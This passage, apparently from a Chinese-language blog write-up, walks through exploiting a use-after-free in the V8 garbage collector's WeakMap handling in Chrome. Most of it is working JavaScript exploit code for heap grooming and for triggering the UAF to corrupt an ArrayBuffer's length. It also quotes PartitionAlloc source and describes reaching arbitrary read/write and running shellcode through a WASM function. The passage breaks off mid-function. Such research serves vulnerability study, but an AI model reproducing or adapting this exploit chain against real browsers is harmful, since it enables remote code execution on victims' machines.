  occupy = new Array(Math.floor(predict_free_space / sizeOfArr));
  for (let i = 0; i &lt; occupy.length; ++i) {
    occupy[i] = [2.7749965545731962e-257];
  }

  TrigerGc();
}

function TrigerGc() {
  try {
    new ArrayBuffer(0x7fe00001);
  } catch (e) {
  }
}
</code></pre></div></div>

<h3 id="布局内存">布局内存</h3>

<p>通过上面的步骤稳定 Oldspace 后，就可以按照思路在 Oldspace 中布局内存，构造 UAF 了。</p>

<p>先是构造若干 0x30, 0x40 的空闲内存空洞。</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">count</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
<span class="kd">let</span> <span class="nx">bufs</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">count</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="nx">count</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">arr2_before</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="nx">count</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">arr2</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">count</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">arr3</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">count</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">arr_keep</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">count</span><span class="p">);</span>

<span class="kd">function</span> <span class="nx">setUpWeakMap</span><span class="p">()</span> <span class="p">{</span>
	<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">arr</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
	    <span class="k">if</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">count</span><span class="p">)</span> <span class="p">{</span>
	      <span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mf">1.4</span><span class="p">,</span> <span class="mf">1.5</span> <span class="p">];</span>
	    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
	      <span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mf">1.4</span><span class="p">,</span> <span class="mf">1.5</span><span class="p">,</span> <span class="mf">1.6</span><span class="p">,</span> <span class="mf">1.7</span> <span class="p">];</span>
	    <span class="p">}</span>
	<span class="p">}</span>

	<span class="nx">TrigerGc</span><span class="p">();</span>
	
	<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">arr</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
	    <span class="k">if</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">count</span><span class="p">)</span> <span class="p">{</span>
	      <span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mf">1.4</span><span class="p">,</span> <span class="mf">1.5</span> <span class="p">];</span>
	    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
	      <span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mf">1.4</span><span class="p">,</span> <span class="mf">1.5</span><span class="p">,</span> <span class="mf">1.6</span><span class="p">,</span> <span class="mf">1.7</span> <span class="p">];</span>
	    <span class="p">}</span>
	<span class="p">}</span>

	<span class="nx">TrigerGc</span><span class="p">();</span>
	
	<span class="p">...</span>
</code></pre></div></div>

<hr />
<p><strong>ℹ️NOTE</strong>：bufs，arr，arr2_before 这些一定要是全局变量，这样它们申请的时机较早，和临时变量处于不同的页面中：</p>
<ul>
  <li>不会影响漏洞利用期间的内存布局</li>
  <li>释放后不会被 Sweep，可以稳定的 UAF</li>
</ul>

<hr />

<p>再申请新数组填入空洞，0x30 空洞被填入 <code class="language-plaintext highlighter-rouge">JSArray</code>，0x40 空洞被填入 <code class="language-plaintext highlighter-rouge">FixedArray</code>(缓冲区)，<code class="language-plaintext highlighter-rouge">JSArray</code> 中有指针指向 <code class="language-plaintext highlighter-rouge">FixedArray</code>。</p>

<p>实际测试中我发现，利用 double 数组（ arr3），额外申请一些 0x10 的空洞，有助于提升利用的稳定性：</p>
<ul>
  <li>可以填充之前已经存在的 0x10 空洞</li>
  <li>可以让 <code class="language-plaintext highlighter-rouge">arr2</code> 中的 <code class="language-plaintext highlighter-rouge">JSArray</code> 不位于空闲块的开头，被 Sweep 后不会被 <code class="language-plaintext highlighter-rouge">FreeSpace</code> 的数据覆盖。</li>
</ul>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="p">...</span>
	
	<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">arr3</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">arr3</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span> <span class="mf">1.1</span> <span class="p">];</span>
	<span class="p">}</span>
	
	<span class="nx">TrigerGc</span><span class="p">();</span>
	
	
	<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">arr2</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">arr2</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span> <span class="mf">1.7</span><span class="p">,</span> <span class="mf">1.7</span><span class="p">,</span> <span class="mf">1.7</span><span class="p">,</span> <span class="mf">1.7</span><span class="p">,</span> <span class="mf">1.7</span><span class="p">,</span> <span class="mf">1.7</span><span class="p">,</span> <span class="mf">1.7</span> <span class="p">];</span>
	<span class="p">}</span>
	
	<span class="nx">TrigerGc</span><span class="p">();</span>
	
	<span class="p">...</span>
</code></pre></div></div>

<p>接下来申请若干 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code>，触发漏洞释放掉 <code class="language-plaintext highlighter-rouge">arr2</code>，触发漏洞的 GC 同时也会把 <code class="language-plaintext highlighter-rouge">ArrayBuffe</code> 移动到 <code class="language-plaintext highlighter-rouge">arr2</code> 中元素所在的 0x40 空洞的位置。</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="p">...</span>
	<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">bufs</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">bufs</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="nx">PreventModifyArr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
	
	<span class="kd">let</span> <span class="nx">hk</span> <span class="o">=</span> <span class="nx">hideWeakMap</span><span class="p">(</span><span class="nx">map</span><span class="p">,</span> <span class="nx">level</span><span class="p">,</span> <span class="nx">initKey</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">hiddenMap</span> <span class="o">=</span> <span class="nx">map</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">hk</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">map7</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">WeakMap</span><span class="p">();</span>
	<span class="kd">let</span> <span class="nx">map8</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">WeakMap</span><span class="p">();</span>
	<span class="kd">let</span> <span class="nx">k5</span> <span class="o">=</span> <span class="p">{</span><span class="na">k5</span> <span class="p">:</span> <span class="mi">5</span><span class="p">};</span>
	<span class="kd">let</span> <span class="nx">map5</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">WeakMap</span><span class="p">();</span>
	<span class="kd">let</span> <span class="nx">k7</span> <span class="o">=</span> <span class="p">{</span><span class="na">k7</span> <span class="p">:</span> <span class="mi">7</span><span class="p">};</span>
	<span class="kd">let</span> <span class="nx">k9</span> <span class="o">=</span> <span class="p">{</span><span class="na">k9</span> <span class="p">:</span> <span class="mi">9</span><span class="p">};</span>
	<span class="kd">let</span> <span class="nx">k8</span> <span class="o">=</span> <span class="p">{</span><span class="na">k8</span> <span class="p">:</span> <span class="mi">8</span><span class="p">};</span>

	
	<span class="nx">map</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">k7</span><span class="p">,</span> <span class="nx">map7</span><span class="p">);</span>
	<span class="nx">hiddenMap</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">k5</span><span class="p">,</span> <span class="nx">map5</span><span class="p">);</span>
	<span class="nx">hiddenMap</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">hk</span><span class="p">,</span> <span class="nx">k5</span><span class="p">);</span>
	<span class="nx">map5</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">hk</span><span class="p">,</span> <span class="nx">k7</span><span class="p">);</span>
	
	<span class="nx">map7</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">k8</span><span class="p">,</span> <span class="nx">map8</span><span class="p">);</span>
	<span class="nx">map7</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">k7</span><span class="p">,</span> <span class="nx">k8</span><span class="p">);</span>
	
	<span class="nx">map8</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">k8</span><span class="p">,</span> <span class="nx">k9</span><span class="p">);</span>
	
	<span class="nx">map</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">k9</span><span class="p">,</span> <span class="nx">arr2</span><span class="p">);</span>
	<span class="nx">arr2_before</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
	<span class="nx">arr2</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>实际测是发现 <code class="language-plaintext highlighter-rouge">JSWeakMap</code> 可能会被移动到关键的数据结构中，影响漏洞利用，所以我又加了一个 <code class="language-plaintext highlighter-rouge">PreventModifyArr</code>，期望可以通过一个较大内存块的分析，让页面末尾的大块空闲内存成为线性分配区，这样之后的其他对象都会被填入这个非常大的线性分配区，而不会影响页面前端的小对象。</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="kd">function</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">setUpWeakMap</span><span class="p">(</span><span class="nx">map1</span><span class="p">);</span>

	<span class="c1">// 触发漏洞</span>
	<span class="nx">TrigerGc</span><span class="p">();</span>
	
	<span class="k">try</span> <span class="p">{</span>
		<span class="kd">let</span> <span class="nx">hiddenKey</span> <span class="o">=</span> <span class="nx">getHiddenKey</span><span class="p">(</span><span class="nx">map1</span><span class="p">,</span> <span class="nx">level</span><span class="p">,</span> <span class="nx">initKey</span><span class="p">);</span>
		<span class="kd">let</span> <span class="nx">hiddenMap</span> <span class="o">=</span> <span class="nx">map1</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">hiddenKey</span><span class="p">);</span>
		<span class="kd">let</span> <span class="nx">k7</span> <span class="o">=</span> <span class="nx">hiddenMap</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">hiddenMap</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">hiddenKey</span><span class="p">)).</span><span class="kd">get</span><span class="p">(</span><span class="nx">hiddenKey</span><span class="p">);</span>
		<span class="kd">let</span> <span class="nx">k8</span> <span class="o">=</span> <span class="nx">map1</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">k7</span><span class="p">).</span><span class="kd">get</span><span class="p">(</span><span class="nx">k7</span><span class="p">);</span>
		<span class="kd">let</span> <span class="nx">m8</span> <span class="o">=</span> <span class="nx">map1</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">k7</span><span class="p">).</span><span class="kd">get</span><span class="p">(</span><span class="nx">k8</span><span class="p">);</span>
		<span class="kd">let</span> <span class="nx">arr_free_uaf</span> <span class="o">=</span> <span class="nx">map1</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">m8</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">k8</span><span class="p">));</span>
		
		<span class="kd">let</span> <span class="nx">arrbuf_as_arr</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
		<span class="k">try</span> <span class="p">{</span>
			<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">arr_free_uaf</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="o">--</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
				<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">arr_free_uaf</span><span class="p">[</span><span class="nx">i</span><span class="p">])</span>
					<span class="k">continue</span><span class="p">;</span>
			
			<span class="nx">maybe_ab_len</span> <span class="o">=</span> <span class="nx">high32</span><span class="p">(</span><span class="nx">ftou</span><span class="p">(</span><span class="nx">arr_free_uaf</span><span class="p">[</span><span class="nx">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]));</span>
			<span class="k">if</span> <span class="p">(</span><span class="nx">maybe_ab_len</span> <span class="o">==</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
				<span class="nx">arrbuf_as_arr</span> <span class="o">=</span> <span class="nx">arr_free_uaf</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
				<span class="nx">arr_free_uaf</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
				<span class="nx">arrbuf_as_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span>
				<span class="nx">utof</span><span class="p">(</span><span class="nx">ftou</span><span class="p">(</span><span class="nx">arrbuf_as_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x10000000000</span><span class="p">));</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="p">}</span>
		<span class="p">}</span>
		
		<span class="k">if</span> <span class="p">(</span><span class="nx">arrbuf_as_arr</span> <span class="o">==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">return</span><span class="p">;</span>
		<span class="p">}</span>
		
		<span class="c1">// maybe point to arraybuffer.byteLength</span>
		<span class="kd">let</span> <span class="nx">arrbuf</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
		<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">bufs</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">if</span> <span class="p">(</span><span class="nx">bufs</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">byteLength</span> <span class="o">!=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
				<span class="nx">arrbuf</span> <span class="o">=</span> <span class="nx">bufs</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="p">}</span>
		<span class="p">}</span>
		
		<span class="k">if</span> <span class="p">(</span><span class="nx">arrbuf</span> <span class="o">==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">return</span><span class="p">;</span>
		<span class="p">}</span>


	<span class="p">...</span>
</code></pre></div></div>

<p>漏洞成功触发后，<code class="language-plaintext highlighter-rouge">arr_free_uaf</code> 指向的就是已经被释放了的 <code class="language-plaintext highlighter-rouge">arr2</code> 数组，它内部指向的元素如果没有被覆盖的话，此时就指向了 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 所在的内存，那么利用 <code class="language-plaintext highlighter-rouge">arr_free_uaf[i]</code> 就可以读/写 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 的内容。</p>

<ul>
  <li>JSArrayBuffer
    <ul>
      <li>0x00 map: taggedptr</li>
      <li>0x04 props: taggedptr</li>
      <li>0x08 elems: taggedptr</li>
      <li>0x0C byte_len: intptr_t</li>
      <li>0x14 max_byte_len: intptr_t</li>
      <li>0x1C backing_store: intptr_t</li>
      <li>0x24 extension: intptr_t</li>
      <li>0x2C bitfield: int32_t</li>
    </ul>
  </li>
</ul>

<p><code class="language-plaintext highlighter-rouge">arr_free_uaf[i][0]</code> 相当于是 <code class="language-plaintext highlighter-rouge">JSArrayBuffer</code> 0x08 偏移处的内同，也就是 elems 和 byte_len 的低 32 位，<code class="language-plaintext highlighter-rouge">arrbuf_as_arr[0] = utof(ftou(arrbuf_as_arr[0]) + BigInt(0x10000000000));</code> 就相当于 <code class="language-plaintext highlighter-rouge">byte_len += 100</code>。</p>

<p>修改了 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 的长度后，我们遍历整个 <code class="language-plaintext highlighter-rouge">bufs</code> 数组，检查 <code class="language-plaintext highlighter-rouge">byteLength</code>，定位到可以通过 <code class="language-plaintext highlighter-rouge">arr_free_uaf</code> 可以读写到的元素。</p>

<h3 id="代码执行">代码执行</h3>

<p>上面已经得到了读写 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 的能力，通过这个能力我们是可以利用 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 实现任意地址读写的，但是我们要读写什么数据，来把它转换成代码执行呢？</p>

<p>也许我们可以再触发一次漏洞，构造出一个 addrof 操作，但是这样必然会进一步降低漏洞利用的稳定性。经过多次尝试，我发现从 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 的 backing_store 入手，借鉴 CVE-2019-13720 的利用思路，可以在只触发一次漏洞的情况下完成利用。</p>

<p>CVE-2019-13720 的利用思路，用到的是 FastMallocPartition 中申请的内存块，而
 backing_store 是从 ArrayBufferPartition 申请的内存块，但是所有的PartitionRoot 都是再同一个函数中定义的 static 变量，它们在内存中是临近的。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// static</span>
<span class="kt">bool</span> <span class="n">Partitions</span><span class="o">::</span><span class="n">InitializeOnce</span><span class="p">()</span> <span class="p">{</span>
<span class="cp">#if !BUILDFLAG(USE_PARTITION_ALLOC_AS_MALLOC)
</span>  <span class="k">static</span> <span class="n">base</span><span class="o">::</span><span class="n">NoDestructor</span><span class="o">&lt;</span><span class="n">base</span><span class="o">::</span><span class="n">PartitionAllocator</span><span class="o">&gt;</span> <span class="n">fast_malloc_allocator</span><span class="p">{};</span>
  <span class="n">fast_malloc_allocator</span><span class="o">-&gt;</span><span class="n">init</span><span class="p">({</span>
    <span class="n">base</span><span class="o">::</span><span class="n">PartitionOptions</span><span class="o">::</span><span class="n">AlignedAlloc</span><span class="o">::</span><span class="n">kDisallowed</span><span class="p">,</span>
        <span class="n">base</span><span class="o">::</span><span class="n">PartitionOptions</span><span class="o">::</span><span class="n">ThreadCache</span><span class="o">::</span><span class="n">kEnabled</span><span class="p">,</span>
        <span class="n">base</span><span class="o">::</span><span class="n">PartitionOptions</span><span class="o">::</span><span class="n">Quarantine</span><span class="o">::</span><span class="n">kAllowed</span><span class="p">,</span>
        <span class="n">base</span><span class="o">::</span><span class="n">PartitionOptions</span><span class="o">::</span><span class="n">Cookies</span><span class="o">::</span><span class="n">kAllowed</span><span class="p">,</span>
<span class="cp">#if BUILDFLAG(ENABLE_BACKUP_REF_PTR_IN_RENDERER_PROCESS)
</span>        <span class="n">base</span><span class="o">::</span><span class="n">PartitionOptions</span><span class="o">::</span><span class="n">RefCount</span><span class="o">::</span><span class="n">kAllowed</span>
<span class="cp">#else
</span>        <span class="n">base</span><span class="o">::</span><span class="n">PartitionOptions</span><span class="o">::</span><span class="n">RefCount</span><span class="o">::</span><span class="n">kDisallowed</span>
<span class="cp">#endif
</span>  <span class="p">});</span>

  <span class="n">fast_malloc_root_</span> <span class="o">=</span> <span class="n">fast_malloc_allocator</span><span class="o">-&gt;</span><span class="n">root</span><span class="p">();</span>
<span class="cp">#endif  // !BUILDFLAG(USE_PARTITION_ALLOC_AS_MALLOC)
</span>
  <span class="k">static</span> <span class="n">base</span><span class="o">::</span><span class="n">NoDestructor</span><span class="o">&lt;</span><span class="n">base</span><span class="o">::</span><span class="n">PartitionAllocator</span><span class="o">&gt;</span> <span class="n">array_buffer_allocator</span><span class="p">{};</span>
  <span class="k">static</span> <span class="n">base</span><span class="o">::</span><span class="n">NoDestructor</span><span class="o">&lt;</span><span class="n">base</span><span class="o">::</span><span class="n">PartitionAllocator</span><span class="o">&gt;</span> <span class="n">buffer_allocator</span><span class="p">{};</span>
  <span class="k">static</span> <span class="n">base</span><span class="o">::</span><span class="n">NoDestructor</span><span class="o">&lt;</span><span class="n">base</span><span class="o">::</span><span class="n">ThreadUnsafePartitionAllocator</span><span class="o">&gt;</span>
      <span class="n">layout_allocator</span><span class="p">{};</span>

  <span class="n">base</span><span class="o">::</span><span class="n">PartitionAllocGlobalInit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Partitions</span><span class="o">::</span><span class="n">HandleOutOfMemory</span><span class="p">);</span>

  <span class="c1">// RefCount disallowed because it will prevent allocations from being 16B</span>
  <span class="c1">// aligned as required by ArrayBufferContents.</span>
  <span class="n">array_buffer_allocator</span><span class="o">-&gt;</span><span class="n">init</span><span class="p">({</span>
    <span class="n">base</span><span class="o">::</span><span class="n">PartitionOptions</span><span class="o">::</span><span class="n">AlignedAlloc</span><span class="o">::</span><span class="n">kDisallowed</span><span class="p">,</span>
        <span class="n">base</span><span class="o">::</span><span class="n">PartitionOptions</span><span class="o">::</span><span class="n">ThreadCache</span><span class="o">::</span><span class="n">kDisabled</span><span class="p">,</span>
        <span class="n">base</span><span class="o">::</span><span class="n">PartitionOptions</span><span class="o">::</span><span class="n">Quarantine</span><span class="o">::</span><span class="n">kAllowed</span><span class="p">,</span>
        <span class="n">base</span><span class="o">::</span><span class="n">PartitionOptions</span><span class="o">::</span><span class="n">Cookies</span><span class="o">::</span><span class="n">kAllowed</span><span class="p">,</span>
        <span class="n">base</span><span class="o">::</span><span class="n">PartitionOptions</span><span class="o">::</span><span class="n">RefCount</span><span class="o">::</span><span class="n">kDisallowed</span>
  <span class="p">});</span>
  <span class="n">buffer_allocator</span><span class="o">-&gt;</span><span class="n">init</span><span class="p">({</span>
    <span class="n">base</span><span class="o">::</span><span class="n">PartitionOptions</span><span class="o">::</span><span class="n">AlignedAlloc</span><span class="o">::</span><span class="n">kDisallowed</span><span class="p">,</span>
        <span class="n">base</span><span class="o">::</span><span class="n">PartitionOptions</span><span class="o">::</span><span class="n">ThreadCache</span><span class="o">::</span><span class="n">kDisabled</span><span class="p">,</span>
        <span class="n">base</span><span class="o">::</span><span class="n">PartitionOptions</span><span class="o">::</span><span class="n">Quarantine</span><span class="o">::</span><span class="n">kAllowed</span><span class="p">,</span>
        <span class="n">base</span><span class="o">::</span><span class="n">PartitionOptions</span><span class="o">::</span><span class="n">Cookies</span><span class="o">::</span><span class="n">kAllowed</span><span class="p">,</span>
<span class="cp">#if BUILDFLAG(ENABLE_BACKUP_REF_PTR_IN_RENDERER_PROCESS)
</span>        <span class="n">base</span><span class="o">::</span><span class="n">PartitionOptions</span><span class="o">::</span><span class="n">RefCount</span><span class="o">::</span><span class="n">kAllowed</span>
<span class="cp">#else
</span>        <span class="n">base</span><span class="o">::</span><span class="n">PartitionOptions</span><span class="o">::</span><span class="n">RefCount</span><span class="o">::</span><span class="n">kDisallowed</span>
<span class="cp">#endif
</span>  <span class="p">});</span>
  <span class="c1">// RefCount disallowed because layout code will be excluded from raw_ptr&lt;T&gt;</span>
  <span class="c1">// rewrite due to performance.</span>
  <span class="n">layout_allocator</span><span class="o">-&gt;</span><span class="n">init</span><span class="p">({</span>
    <span class="n">base</span><span class="o">::</span><span class="n">PartitionOptions</span><span class="o">::</span><span class="n">AlignedAlloc</span><span class="o">::</span><span class="n">kDisallowed</span><span class="p">,</span>
        <span class="n">base</span><span class="o">::</span><span class="n">PartitionOptions</span><span class="o">::</span><span class="n">ThreadCache</span><span class="o">::</span><span class="n">kDisabled</span><span class="p">,</span>
        <span class="n">base</span><span class="o">::</span><span class="n">PartitionOptions</span><span class="o">::</span><span class="n">Quarantine</span><span class="o">::</span><span class="n">kAllowed</span><span class="p">,</span>
        <span class="n">base</span><span class="o">::</span><span class="n">PartitionOptions</span><span class="o">::</span><span class="n">Cookies</span><span class="o">::</span><span class="n">kAllowed</span><span class="p">,</span>
        <span class="n">base</span><span class="o">::</span><span class="n">PartitionOptions</span><span class="o">::</span><span class="n">RefCount</span><span class="o">::</span><span class="n">kDisallowed</span>
  <span class="p">});</span>

  <span class="n">array_buffer_root_</span> <span class="o">=</span> <span class="n">array_buffer_allocator</span><span class="o">-&gt;</span><span class="n">root</span><span class="p">();</span>
  <span class="n">buffer_root_</span> <span class="o">=</span> <span class="n">buffer_allocator</span><span class="o">-&gt;</span><span class="n">root</span><span class="p">();</span>
  <span class="n">layout_root_</span> <span class="o">=</span> <span class="n">layout_allocator</span><span class="o">-&gt;</span><span class="n">root</span><span class="p">();</span>

<span class="cp">#if defined(PA_ALLOW_PCSCAN)
</span>  <span class="k">if</span> <span class="p">(</span><span class="n">base</span><span class="o">::</span><span class="n">FeatureList</span><span class="o">::</span><span class="n">IsEnabled</span><span class="p">(</span><span class="n">base</span><span class="o">::</span><span class="n">features</span><span class="o">::</span><span class="n">kPartitionAllocPCScan</span><span class="p">)</span> <span class="o">||</span>
      <span class="n">base</span><span class="o">::</span><span class="n">FeatureList</span><span class="o">::</span><span class="n">IsEnabled</span><span class="p">(</span><span class="n">kPCScanBlinkPartitions</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">base</span><span class="o">::</span><span class="n">internal</span><span class="o">::</span><span class="n">PCScan</span><span class="o">::</span><span class="n">RegisterNonScannableRoot</span><span class="p">(</span><span class="n">array_buffer_root_</span><span class="p">);</span>
<span class="cp">#if !BUILDFLAG(USE_PARTITION_ALLOC_AS_MALLOC)
</span>    <span class="n">base</span><span class="o">::</span><span class="n">internal</span><span class="o">::</span><span class="n">PCScan</span><span class="o">::</span><span class="n">RegisterScannableRoot</span><span class="p">(</span><span class="n">fast_malloc_root_</span><span class="p">);</span>
<span class="cp">#endif
</span>    <span class="n">base</span><span class="o">::</span><span class="n">internal</span><span class="o">::</span><span class="n">PCScan</span><span class="o">::</span><span class="n">RegisterScannableRoot</span><span class="p">(</span><span class="n">buffer_root_</span><span class="p">);</span>
  <span class="p">}</span>
<span class="cp">#endif  // defined(PA_ALLOW_PCSCAN)
</span>
  <span class="n">initialized_</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">initialized_</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>

<p>有了 backing_store 的地址，就可以读到 ArrayBufferPartitionRoot 的地址，从而计算出 FastMallocPartitionRoot 的地址。之后就可以依照 CVE-2019-13720 的利用思路读取到一个 FileReader 对象的地址，又从 FileReader.onerror 事件回调读取到 WASM 导出函数的地址，利用任意内存写将 shellcode 填入 WASM 导出函数，之后调用导出函数就可以执行 shellcode 了。</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="kd">function</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="p">...</span>
	
			<span class="kd">function</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
